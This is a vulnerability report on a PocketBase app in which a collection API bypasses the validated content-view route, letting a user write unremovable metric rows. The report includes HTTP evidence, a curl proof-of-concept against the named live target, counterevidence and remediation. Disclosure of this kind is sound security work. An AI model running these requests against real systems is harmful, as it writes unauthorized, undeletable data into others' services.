# Custom content-view route validation bypassed by direct collection write, allowing unbounded self-attributed metric rows

**ID:** vuln-0008
**Severity:** MEDIUM
**Found:** 2026-09-12 15:41:46 UTC
**Target:** https://app.milenkih-team.ru
**Endpoint:** /api/collections/content_views/records
**Method:** POST
**CWE:** CWE-602
**CVSS:** 4.3
**Confidence:** High
**Fix Effort:** Low

## Description

The application provides a dedicated endpoint, `POST /api/content-view`, that validates view-tracking input before storing it. The underlying `content_views` collection, however, remains directly writable through the generic PocketBase collection API with only a self-scoped rule, so an authenticated member can create view rows carrying `object_type` / `object_id` / `source` values that the application's own validator rejects. The rows cannot be read back or deleted by any non-superuser, so they accumulate permanently in the table that the moderator statistics dashboard aggregates.

## Evidence

Live requests as an ordinary `user` account.

Negative control — the application route rejects the malformed value:

```http
POST /api/content-view HTTP/1.1
Authorization: <user-token>
Content-Type: application/json

{"object_type":"zqath3bad","object_id":"zqath3abc"}
```
```http
HTTP/1.1 400 Bad Request
{"error":"object_type must be post or tournament_post"}
```

Validator bypass — the same value is accepted through the collection endpoint:

```http
POST /api/collections/content_views/records HTTP/1.1
Authorization: <user-token>
Content-Type: application/json

{"user":"<self>","object_type":"zqath3bad","object_id":"zqath3abc","source":"zqath3bad"}
```
```http
HTTP/1.1 200 OK
{"id":"<new id>","user":"<self>","object_type":"zqath3bad","object_id":"zqath3abc","source":"zqath3bad", ...}
```

The created row is neither readable nor deletable by its author:

```http
GET /api/collections/content_views/records/<new id> HTTP/1.1
Authorization: <user-token>
```
```http
HTTP/1.1 403 Forbidden
{"data":{},"message":"Only superusers can perform this action.","status":403}
```

```http
DELETE /api/collections/content_views/records/<new id> HTTP/1.1
Authorization: <user-token>
```
```http
HTTP/1.1 403 Forbidden
{"data":{},"message":"Only superusers can perform this action.","status":403}
```

Collection rules from the deployment's schema export:

```json
{
  "name": "content_views",
  "listRule": null,
  "viewRule": null,
  "createRule": "@request.auth.id != \"\" && user = @request.auth.id",
  "updateRule": null,
  "deleteRule": null
}
```

## Impact

A member can write arbitrary, permanently-retained rows into the content-view metrics table. The application's validation — which restricts `object_type` to `post` or `tournament_post`, requires a non-empty `object_id`, and restricts `source` to `viewport` or `modal` — is bypassed. Because `content_views` has no delete rule for non-superusers, the rows cannot be cleaned up by their author, so the distortion is durable. The direct impact is capped: the statistics consumers are moderator-only and the reach report re-resolves each object server-side before presenting it, so a fabricated `object_id` does not inject a spurious entry into the displayed top-content list. The practical effect is inflated or meaningless view-metric data and unbounded table growth in an analytics collection.

## Counterevidence

The strongest case against this finding is that it has no direct security consequence: every consumer of `content_views` is a moderator-only statistics endpoint, the reach report re-resolves each referenced object server-side via `$app.findRecordById`, so a fabricated `object_id` cannot inject a spurious row into the displayed report, and there is no cross-user read or write — the create rule forces `user = @request.auth.id` and any attempt to attribute a row to another user is rejected with `400`. I also verified that reading the table is denied to non-superusers (`403`), so a member cannot even confirm what was written. What remains is a genuine but low-impact control gap: validation implemented for the application's own route is not enforced by the data store, an alternate write path exists for the same table, and rows created through it are permanently unremovable because the delete rule is null. It is reported because it is a real inconsistency between two paths to the same data rather than as a high-impact issue.

## What Would Change This Severity

Confirmation that a player-facing or public surface derives a metric from `content_views` (for example popularity ordering, or content promoted on view count) would raise the severity, since the values would then be attacker-controlled and externally visible. Conversely, confirming that the table is retained only for internal aggregate statistics with no decision-making role would lower it to informational.

## Technical Analysis

The application exposes a purpose-built write path for view tracking:

```javascript title=pb_hooks/statslib.js startLineNumber=856 endLineNumber=878
function createContentView(userId, payload) {
  payload = payload || {};
  var objectType = String(payload.object_type || payload.objectType || '');
  var objectId = String(payload.object_id || payload.objectId || '');
  var source = String(payload.source || '');

  if (objectType !== 'post' && objectType !== 'tournament_post') {
    return { error: 'object_type must be post or tournament_post', status: 400 };
  }
  if (!objectId) {
    return { error: 'object_id required', status: 400 };
  }
  if (source && source !== 'viewport' && source !== 'modal') {
    return { error: 'source must be viewport or modal', status: 400 };
  }
  ...
```

The handler `POST /api/content-view` enforces these checks. However, the collection that the handler writes to remains directly reachable through PocketBase's standard record API, and its schema rule permits any authenticated user to create a row as long as the row is attributed to themselves:

```text
content_views.createRule = '@request.auth.id != "" && user = @request.auth.id'
content_views.listRule  = null
content_views.viewRule  = null
content_views.updateRule = null
content_views.deleteRule = null
```

Because `listRule` and `deleteRule` are null, the collection is write-only for non-superusers: rows cannot be read back nor removed through the API. The validation implemented for the application's own route is therefore not a property of the data store, and the same input is accepted when submitted through the generic collection endpoint.

There is also no server-side de-duplication or per-object limit on either path, so row volume is bounded only by request count.

The consumption side does not compound the issue: `getReach` re-resolves each referenced object server-side via `$app.findRecordById` (`pb_hooks/statslib.js:302-313`) before presenting it, so a fabricated identifier cannot inject an arbitrary entry into the moderator report. All statistics endpoints additionally require the moderator role.

## Proof of Concept

1. Authenticate as an ordinary `user` account.
2. Send the malformed value through the application's own validated route to establish the negative control: `POST /api/content-view` with `object_type` set to an invalid value returns `400` with `object_type must be post or tournament_post`.
3. Send the identical malformed value directly to the collection endpoint: `POST /api/collections/content_views/records` with the same invalid `object_type`. The server returns `200` and creates the record, demonstrating that the validator is bypassed.
4. Confirm the row is durably stored and that the author cannot remove it: a subsequent `GET` on the record returns `403 Only superusers can perform this action`, and `DELETE` on the row also returns `403`.
5. Repeat step 3 to show that nothing limits the number of rows that can be created.

```bash
TARGET="https://app.milenkih-team.ru"
TOKEN='<low-privilege user JWT>'
SELF='<own user id>'

# 1. Negative control - the application's own route rejects the malformed value
curl -s -X POST -H "Authorization: $TOKEN" -H 'Content-Type: application/json' \
  -d '{"object_type":"zqath3bad","object_id":"zqath3abc"}' \
  "$TARGET/api/content-view"
# => 400 {"error":"object_type must be post or tournament_post"}

# 2. Validator bypass - the collection endpoint accepts the same value
curl -s -X POST -H "Authorization: $TOKEN" -H 'Content-Type: application/json' \
  -d '{"user":"'$SELF'","object_type":"zqath3bad","object_id":"zqath3abc","source":"zqath3bad"}' \
  "$TARGET/api/collections/content_views/records"
# => 200 {"id":"<new id>","user":"<self>","object_type":"zqath3bad", ...}

# 3. The row cannot be read back or deleted by its author
curl -s -H "Authorization: $TOKEN" \
  "$TARGET/api/collections/content_views/records/<new id>"
# => 403 {"message":"Only superusers can perform this action.","status":403}

curl -s -X DELETE -H "Authorization: $TOKEN" \
  "$TARGET/api/collections/content_views/records/<new id>"
# => 403 {"message":"Only superusers can perform this action.","status":403}
```

## Remediation

Make the data store enforce the same constraints the application route enforces.

1. Tighten the `content_views` collection rules so the generic record endpoint cannot be used as an alternate write path: restrict creation to server-side code (set the create rule to a value no client can satisfy and have the `POST /api/content-view` handler perform the write with application privileges), or add a collection-level `onRecordCreateRequest` hook that applies the same `object_type` / `object_id` / `source` validation as `createContentView`.
2. Apply the validation in one place and reuse it: have the collection hook call the same logic used by the route, so the two paths cannot drift apart again.
3. Add a delete rule (or a maintenance job) so that erroneous or abusive rows can be removed; currently no non-superuser can delete a row, and there is no visible retention policy for this table.
4. Add rate limiting or server-side de-duplication (for example, one row per user/object/time-window) to bound how many rows a single account can create, on both the route and the collection endpoint.
5. Purge the test rows left in the table: rows with `object_id` values prefixed `zqath3` were created during this assessment and could not be deleted through the API.

## Assumptions

Assumes an authenticated member account, which is the application's normal user role. No moderator privileges or victim interaction are required. The impact assessment assumes the moderator statistics dashboard is the only consumer of this table, which was verified by reading `pb_hooks/stats.pb.js` and `pb_hooks/statslib.js`.
